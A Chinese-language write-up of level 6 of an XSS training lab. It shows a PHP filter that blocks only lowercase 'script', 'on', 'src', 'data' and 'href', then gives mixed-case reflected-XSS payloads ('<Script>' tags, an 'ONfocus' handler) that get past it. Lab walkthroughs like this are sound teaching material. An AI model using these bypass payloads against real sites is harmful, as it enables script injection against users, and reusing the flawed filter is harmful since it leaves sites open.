# Level-6 （str_replace 区分大小写 → 大小写绕过）

## 万能探针

```
<SCRscriptIPT>'"()Oonnjavascript
```

## 查看分析源码

```php
$str = $_GET["keyword"];                          // ★ 没有 strtolower！
$str2 = str_replace("<script","<scr_ipt",$str);   // 小写 script
$str3 = str_replace("on","o_n",$str2);            // 小写 on
$str4 = str_replace("src","sr_c",$str3);          // 小写 src
$str5 = str_replace("data","da_ta",$str4);        // 小写 data
$str6 = str_replace("href","hr_ef",$str5);        // 小写 href
echo '<input name=keyword value="'.$str6.'">';
```

比第 5 关多封了三样（src/data/href），但少了一个 `strtolower`

`str_replace` 区分大小写 → `<Script>` ≠ `<script>`，不过滤

`onfocus` → `ONfocus` 不过滤

所有防御全废，退回第 2 关的难度

## 构造 payload

```
"><Script>alert(1)</Script>
```

或者事件：

```
" ONfocus="alert(1)" autofOcus="
```
![](99_Attachments/图片/level6/file-20260616202804354.png)
## 闭合原理

和第 2 关一样，就是 `<script>` 里 S 大写：

```html
<input name=keyword value=""><Script>alert(1)</Script>">
```

一个字母大写绕全部。
